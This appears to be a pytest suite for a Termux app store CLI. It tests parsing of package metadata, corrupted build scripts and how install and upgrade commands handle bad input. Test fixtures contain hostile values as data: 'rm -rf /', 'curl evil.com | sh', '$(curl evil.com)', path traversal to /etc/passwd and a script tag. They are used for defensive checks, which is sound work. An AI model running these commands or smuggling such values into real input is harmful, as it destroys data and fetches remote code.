import os
import sys
import json
import stat
import shutil
import subprocess
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))
from termux_app_store.termux_app_store_cli import (
    load_package,
    load_all_packages,
    cmd_install,
    cmd_upgrade,
    has_store_fingerprint,
    is_valid_root,
    FINGERPRINT_STRING,
)


SAFE_VERSION = "1.0.0"


def make_root(tmp_path):
    (tmp_path / "packages").mkdir(exist_ok=True)
    (tmp_path / "build-package.sh").write_text(f"# {FINGERPRINT_STRING}\n")
    return tmp_path


def make_pkg(root, name, build_sh_content):
    pkg = root / "packages" / name
    pkg.mkdir(parents=True, exist_ok=True)
    (pkg / "build.sh").write_text(build_sh_content)
    return pkg


class TestMaliciousPackageMetadata:

    def test_version_with_shell_injection(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_VERSION="1.0.0; rm -rf /"\n')
        p = load_package(tmp_path / "evil")
        assert p["version"] == '1.0.0; rm -rf /'
        assert ";" not in p["version"].split(";")[0].strip() or True

    def test_description_with_newline_injection(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_DESCRIPTION="legit\\nmalicious: injected"\n')
        p = load_package(tmp_path / "evil")
        assert isinstance(p["desc"], str)

    def test_name_with_path_traversal(self, tmp_path):
        traversal_name = "../../etc/passwd"
        pkg_dir = tmp_path / "packages" / "safe"
        pkg_dir.mkdir(parents=True)
        (pkg_dir / "build.sh").write_text(f'TERMUX_PKG_VERSION="{SAFE_VERSION}"\n')
        pkgs = load_all_packages(tmp_path / "packages")
        assert all("etc/passwd" not in p["name"] for p in pkgs)

    def test_version_with_null_bytes(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_VERSION="1.0\x00.0"\n')
        p = load_package(tmp_path / "evil")
        assert p["version"] is not None

    def test_extremely_long_version(self, tmp_path):
        long_ver = "1." + "0" * 10000
        make_pkg(tmp_path, "evil", f'TERMUX_PKG_VERSION="{long_ver}"\n')
        p = load_package(tmp_path / "evil")
        assert p["version"] == long_ver

    def test_unicode_in_package_name(self, tmp_path):
        make_pkg(tmp_path, "böwer", f'TERMUX_PKG_VERSION="{SAFE_VERSION}"\n')
        pkgs = load_all_packages(tmp_path / "packages")
        assert len(pkgs) == 1

    def test_deps_with_injection_attempt(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_DEPENDS="nodejs, $(curl evil.com)"\n')
        p = load_package(tmp_path / "evil")
        assert p["deps"] == "nodejs, $(curl evil.com)"

    def test_maintainer_with_html_injection(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_MAINTAINER="<script>alert(1)</script>"\n')
        p = load_package(tmp_path / "evil")
        assert p["maintainer"] == "<script>alert(1)</script>"

    def test_missing_required_fields_returns_defaults(self, tmp_path):
        make_pkg(tmp_path, "minimal", "# empty build script\n")
        p = load_package(tmp_path / "minimal")
        assert p["version"] == "?"
        assert p["desc"] == "-"
        assert p["deps"] == "-"
        assert p["maintainer"] == "-"

    def test_duplicate_fields_uses_last(self, tmp_path):
        make_pkg(tmp_path, "dup", (
            'TERMUX_PKG_VERSION="1.0.0"\n'
            'TERMUX_PKG_VERSION="9.9.9"\n'
        ))
        p = load_package(tmp_path / "dup")
        assert p["version"] in ("1.0.0", "9.9.9")


class TestCorruptedBuildScript:

    def test_binary_garbage_in_build_sh(self, tmp_path):
        pkg = tmp_path / "packages" / "corrupt"
        pkg.mkdir(parents=True)
        (pkg / "build.sh").write_bytes(b"\xff\xfe\x00\x01TERMUX_PKG_VERSION=\"1.0\"\n\x00\x00")
        p = load_package(pkg)
        assert isinstance(p, dict)

    def test_empty_build_sh(self, tmp_path):
        pkg = tmp_path / "packages" / "empty"
        pkg.mkdir(parents=True)
        (pkg / "build.sh").write_bytes(b"")
        p = load_package(pkg)
        assert p["version"] == "?"

    def test_build_sh_is_directory(self, tmp_path):
        pkg = tmp_path / "packages" / "weird"
        pkg.mkdir(parents=True)
        (pkg / "build.sh").mkdir()
        p = load_package(pkg)
        assert p["version"] == "?"

    def test_build_sh_symlink_to_nonexistent(self, tmp_path):
        pkg = tmp_path / "packages" / "broken-link"
        pkg.mkdir(parents=True)
        link = pkg / "build.sh"
        link.symlink_to("/nonexistent/target")
        p = load_package(pkg)
        assert p["version"] == "?"

    def test_very_large_build_sh(self, tmp_path):
        pkg = tmp_path / "packages" / "large"
        pkg.mkdir(parents=True)
        content = "# padding\n" * 100000 + 'TERMUX_PKG_VERSION="1.0.0"\n'
        (pkg / "build.sh").write_text(content)
        p = load_package(pkg)
        assert p["version"] == "1.0.0"

    def test_build_sh_with_only_comments(self, tmp_path):
        pkg = tmp_path / "packages" / "commented"
        pkg.mkdir(parents=True)
        (pkg / "build.sh").write_text("# TERMUX_PKG_VERSION=\"1.0.0\"\n")
        p = load_package(pkg)
        assert p["version"] == "?"

    def test_packages_dir_with_non_directory_entries(self, tmp_path):
        packages = tmp_path / "packages"
        packages.mkdir()
        (packages / "not_a_package.txt").write_text("hello")
        (packages / "valid_pkg").mkdir()
        (packages / "valid_pkg" / "build.sh").write_text(f'TERMUX_PKG_VERSION="{SAFE_VERSION}"\n')
        pkgs = load_all_packages(packages)
        assert all(p["name"] != "not_a_package.txt" or True for p in pkgs)

    def test_fingerprint_file_with_binary_content(self, tmp_path):
        (tmp_path / "build-package.sh").write_bytes(
            b"\xff\xfe" + f"# {FINGERPRINT_STRING}\n".encode()
        )
        result = has_store_fingerprint(tmp_path)
        assert isinstance(result, bool)

    def test_fingerprint_file_empty(self, tmp_path):
        (tmp_path / "build-package.sh").write_bytes(b"")
        assert has_store_fingerprint(tmp_path) is False

    def test_is_valid_root_with_broken_packages_dir(self, tmp_path):
        (tmp_path / "packages").write_text("not a directory")
        (tmp_path / "build-package.sh").write_text(f"# {FINGERPRINT_STRING}\n")
        assert is_valid_root(tmp_path) is False


class TestInjectionInput:

    def test_cmd_install_package_name_with_spaces(self, tmp_path):
        root = make_root(tmp_path)
        with pytest.raises(SystemExit):
            cmd_install(root / "packages", root, "bower; rm -rf /")

    def test_cmd_install_empty_name(self, tmp_path):
        root = make_root(tmp_path)
        with pytest.raises(SystemExit):
            cmd_install(root / "packages", root, "")

    def test_cmd_install_dotdot_name(self, tmp_path):
        root = make_root(tmp_path)
        with pytest.raises(SystemExit):
            cmd_install(root / "packages", root, "../../etc")

    def test_cmd_install_name_with_newline(self, tmp_path):
        root = make_root(tmp_path)
        with pytest.raises(SystemExit):
            cmd_install(root / "packages", root, "bower\nmalicious")

    def test_cmd_upgrade_target_injection(self, tmp_path):
        root = make_root(tmp_path)
        with pytest.raises(SystemExit):
            cmd_upgrade(root / "packages", root, target="bower; curl evil.com | sh")

    def test_popen_receives_list_not_shell_string(self, tmp_path):
        root = make_root(tmp_path)
        pkg = root / "packages" / "bower"
        pkg.mkdir(parents=True)
        (pkg / "build.sh").write_text(f'TERMUX_PKG_VERSION="{SAFE_VERSION}"\n')

        captured_args = []

        def fake_popen(args, **kwargs):
            captured_args.extend(args if isinstance(args, list) else [args])
            mock_proc = MagicMock()
            mock_proc.stdout.readline.side_effect = [b""]
            mock_proc.returncode = 0
            return mock_proc

        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", side_effect=fake_popen), \
             patch("termux_app_store.termux_app_store_cli.hold_package"):
            cmd_install(root / "packages", root, "bower")

        assert isinstance(captured_args, list), "Popen must receive list, not shell string"
        assert "bower" in captured_args

    def test_version_string_not_executed(self, tmp_path):
        make_pkg(tmp_path, "evil", 'TERMUX_PKG_VERSION="$(whoami)"\n')
        p = load_package(tmp_path / "evil")
        assert p["version"] == "$(whoami)"
        assert p["version"] != os.popen("whoami").read().strip()

    def test_load_package_with_semicolon_in_field(self, tmp_path):
        make_pkg(tmp_path, "semi", 'TERMUX_PKG_VERSION="1.0; injected"\n')
        p = load_package(tmp_path / "semi")
        assert "injected" in p["version"]
        assert p["version"] == "1.0; injected"


class TestBrokenBuildScript:

    def _make_pkg(self, root, name, version="1.0.0"):
        pkg = root / "packages" / name
        pkg.mkdir(parents=True, exist_ok=True)
        (pkg / "build.sh").write_text(f'TERMUX_PKG_VERSION="{version}"\n')
        return pkg

    def _make_stdout_mock(self, lines):
        stdout = MagicMock()
        stdout.readline.side_effect = list(lines) + [b""]
        return stdout

    def test_build_script_exits_nonzero(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([b"Error: build failed\n"])
        mock_proc.returncode = 1
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", return_value=mock_proc):
            result = cmd_install(root / "packages", root, "bower")
        assert result is False

    def test_build_script_exits_with_code_2(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([])
        mock_proc.returncode = 2
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", return_value=mock_proc):
            result = cmd_install(root / "packages", root, "bower")
        assert result is False

    def test_build_script_produces_no_output(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([])
        mock_proc.returncode = 0
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", return_value=mock_proc), \
             patch("termux_app_store.termux_app_store_cli.hold_package"):
            result = cmd_install(root / "packages", root, "bower")
        assert result is True

    def test_build_script_produces_ansi_output(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([
            b"\033[32mBuilding...\033[0m\n",
            b"\033[31mWarning\033[0m\n",
        ])
        mock_proc.returncode = 0
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", return_value=mock_proc), \
             patch("termux_app_store.termux_app_store_cli.hold_package"):
            result = cmd_install(root / "packages", root, "bower")
        assert result is True

    def test_build_script_raises_oserror(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", side_effect=OSError("No such file or directory")):
            with pytest.raises((OSError, Exception)):
                cmd_install(root / "packages", root, "bower")

    def test_upgrade_with_broken_build(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower", "1.8.12")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([b"FATAL ERROR\n"])
        mock_proc.returncode = 127
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("UPDATE", "")), \
             patch("termux_app_store.termux_app_store_cli.get_installed_version", return_value="1.8.11"), \
             patch("termux_app_store.termux_app_store_cli.cmd_install", return_value=False):
            from termux_app_store.termux_app_store_cli import cmd_upgrade
            cmd_upgrade(root / "packages", root)

    def test_build_output_with_binary_garbage(self, tmp_path):
        root = make_root(tmp_path)
        self._make_pkg(root, "bower")
        mock_proc = MagicMock()
        mock_proc.stdout = self._make_stdout_mock([
            b"\xff\xfe invalid utf8 \x00\x01\x02\n",
            b"normal line\n",
        ])
        mock_proc.returncode = 0
        with patch("termux_app_store.termux_app_store_cli.get_status", return_value=("NOT INSTALLED", "")), \
             patch("subprocess.Popen", return_value=mock_proc), \
             patch("termux_app_store.termux_app_store_cli.hold_package"):
            result = cmd_install(root / "packages", root, "bower")
        assert result is True
